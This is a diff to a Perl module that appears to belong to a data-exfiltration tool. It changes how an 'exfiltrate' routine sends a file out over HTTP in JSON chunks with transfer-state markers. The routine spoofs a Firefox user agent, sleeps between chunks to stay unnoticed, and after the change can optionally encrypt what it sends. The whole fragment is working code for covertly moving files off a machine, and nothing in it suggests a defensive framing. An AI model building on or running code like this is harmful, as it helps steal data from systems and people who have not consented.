@@ -29,7 +29,7 @@ sub setHeader {
 }
 
 sub sendData {
-    my($request, $userAgent, $file, $data, $id, $state) = @_;
+    my($self, $request, $userAgent, $file, $data, $id, $state) = @_;
     my $res = 0;
 
     my $hash = {
@@ -39,7 +39,7 @@ sub sendData {
         state   =>  $state
     };
 
-    $request->content(encode_json $hash);
+    $request->content($self->encryptionKey ? $self->SUPER::encrypt(encode_json $hash) : encode_json($hash));
 
     while (!$res || $res->code != 200) {
         $res = $userAgent->request($request);
@@ -54,24 +54,24 @@ sub exfiltrate {
     my $id = int(rand(100000)) + int(rand(100));
 
     my $fileSize = $self->SUPER::load($file);
-    my $progress = Term::ProgressBar->new ({count => $fileSize ,name => "Sending $file",ETA=>'linear'});
+    my $progress = Term::ProgressBar->new ({count => $fileSize, name => "Sending $file", ETA=>'linear'});
 
     $userAgent->agent('Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0');
 
     setHeader($request);
 
-    sendData($request, $userAgent, $file, '', $id, $START_TRANSFER);
+    sendData($self, $request, $userAgent, $file, '', $id, $START_TRANSFER);
 
     $count = 0;
     while (($n = read $self->file, $data, $self->size) != 0) {
         $count += $n;
-        sendData($request, $userAgent, $file, $data, $id, $IN_TRANSFER);
+        sendData($self, $request, $userAgent, $file, $data, $id, $IN_TRANSFER);
         $progress->update($count);
 
         sleep($self->delay);
     }
 
-    sendData($request, $userAgent, $file, '', $id, $END_TRANSFER);
+    sendData($self, $request, $userAgent, $file, '', $id, $END_TRANSFER);
 
     print "\n";
 
